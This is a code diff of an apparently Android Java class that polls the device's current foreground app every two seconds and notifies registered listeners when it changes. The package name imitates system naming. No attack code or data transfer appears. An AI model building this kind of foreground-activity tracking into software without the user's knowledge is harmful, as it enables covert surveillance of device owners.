@@ -10,6 +10,7 @@
 package com.android.deviceinfo.listener;
 
 import com.android.deviceinfo.RunningProcesses;
+import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.util.Check;
 
@@ -20,16 +21,16 @@ public class BroadcastMonitorProcess extends Thread {
 
 	private boolean stop;
 	private final int period;
-	int oldForeDigest = 0;
+	String oldForeDigest = "";
 
-	RunningProcesses runningProcess;
+	
 
 	private ListenerProcess listenerProcess;
 
 	public BroadcastMonitorProcess() {
 		stop = false;
-		period = 5000; // Poll interval
-		runningProcess = new RunningProcesses();
+		period = 2000; // Poll interval
+		
 		
 		if (Cfg.DEBUG) {
 			setName(getClass().getSimpleName());
@@ -38,20 +39,17 @@ public class BroadcastMonitorProcess extends Thread {
 
 	@Override
 	public void run() {
-		do {
-			if (stop) {
-				return;
-			}
-			runningProcess.update();
-			int foreDigest = runningProcess.getForegroundDigest();
+		while (!stop) {
+			
+			String foreDigest = Status.self().getForeground();
 
-			if (foreDigest != oldForeDigest) {
+			if (!foreDigest.equals(oldForeDigest)) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (run), changed fore, dispatching");
 				}
 				oldForeDigest = foreDigest;
 
-				listenerProcess.dispatch(runningProcess);
+				listenerProcess.dispatch(foreDigest);
 			}
 
 			try {
@@ -67,7 +65,7 @@ public class BroadcastMonitorProcess extends Thread {
 					Check.log(e);//$NON-NLS-1$
 				}
 			}
-		} while (true);
+		} ;
 	}
 
 	synchronized void register(ListenerProcess listenerProcess) {
